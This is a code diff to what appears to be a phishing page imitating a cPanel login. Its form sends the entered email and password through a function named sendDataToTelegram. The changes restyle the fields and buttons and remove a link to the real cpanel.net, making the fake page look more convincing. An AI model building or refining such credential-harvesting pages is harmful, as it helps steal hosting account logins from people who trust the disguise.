@@ -54,7 +54,7 @@
 
         .input-group {
             position: relative;
-            margin-bottom: 20px;
+            margin-bottom: 40px; /* Increased spacing */
         }
 
         .input-group input {
@@ -67,17 +67,17 @@
 
         .input-group .icon {
             position: absolute;
-            top: 50%;
+            top: calc(50% + 6px); /* Moved down by 6px */
             left: 10px;
             transform: translateY(-50%);
-            color: #777;
+            color: rgba(0, 0, 0, 0.5); /* Dark blurry color */
             font-size: 18px;
         }
 
         .login-box button {
             width: 100%;
             padding: 10px;
-            background-color: #007bff;
+            background-color: #004080; /* Darker blue */
             border: none;
             border-radius: 5px;
             color: white;
@@ -85,51 +85,7 @@
         }
 
         .login-box button:hover {
-            background-color: #0056b3;
-        }
-
-        .or-divider {
-            display: flex;
-            align-items: center;
-            margin: 20px 0;
-        }
-
-        .or-divider hr {
-            flex: 1;
-            border: none;
-            border-top: 1px solid #ccc;
-        }
-
-        .or-divider .circle {
-            margin: 0 15px;
-            padding: 5px 10px;
-            border: 1px solid #ccc;
-            border-radius: 50%;
-            font-size: 14px;
-            color: #777;
-        }
-
-        .cpanel-login {
-            margin-top: 20px;
-        }
-
-        .cpanel-login button {
-            width: 100%;
-            padding: 10px;
-            background-color: #ff7f0f;
-            border: none;
-            border-radius: 5px;
-            color: white;
-            font-size: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-        }
-
-        .cpanel-login .icon-infinity {
-            margin-right: 10px;
-            font-size: 18px;
+            background-color: #003366; /* Darker hover effect */
         }
 
         .languages {
@@ -153,6 +109,11 @@
             color: gray;
             text-decoration: none;
         }
+
+        .footer a:before {
+            content: "∞ "; /* Infinity sign */
+            font-size: 16px;
+        }
     </style>
 </head>
 <body>
@@ -166,30 +127,19 @@
         <div class="login-box">
             <form onsubmit="sendDataToTelegram(event)">
                 <div class="input-group">
-                    <span class="icon">&#128100;</span> <!-- User icon -->
-                    <input type="text" id="email" name="email" placeholder="Email Address" required>
+                    <label for="email">Email Address</label>
+                    <span class="icon">&#128100;</span> <!-- Blurred dark user icon -->
+                    <input type="text" id="email" name="email" required>
                 </div>
 
                 <div class="input-group">
-                    <span class="icon">&#128274;</span> <!-- Lock icon -->
-                    <input type="password" id="password" name="password" placeholder="Password" required>
+                    <label for="password">Password</label>
+                    <span class="icon">&#128274;</span> <!-- Blurred dark lock icon -->
+                    <input type="password" id="password" name="password" required>
                 </div>
 
                 <button type="submit">Log in</button>
             </form>
-
-            <div class="or-divider">
-                <hr>
-                <span class="circle">OR</span>
-                <hr>
-            </div>
-
-            <div class="cpanel-login">
-                <button onclick="redirectToCpanel()">
-                    <span class="icon-infinity">&#8734;</span> <!-- Infinity-like icon -->
-                    Log in via cPanelID
-                </button>
-            </div>
         </div>
 
         <div class="languages">
@@ -278,10 +228,6 @@
                 notificationBar.textContent = "An error occurred. Please try again.";
                 notificationBar.className = "notification-bar error-bar";
             }
-        }
-
-        function redirectToCpanel() {
-            window.location.href = "https://cpanel.net";
         }
     </script>
 </body>
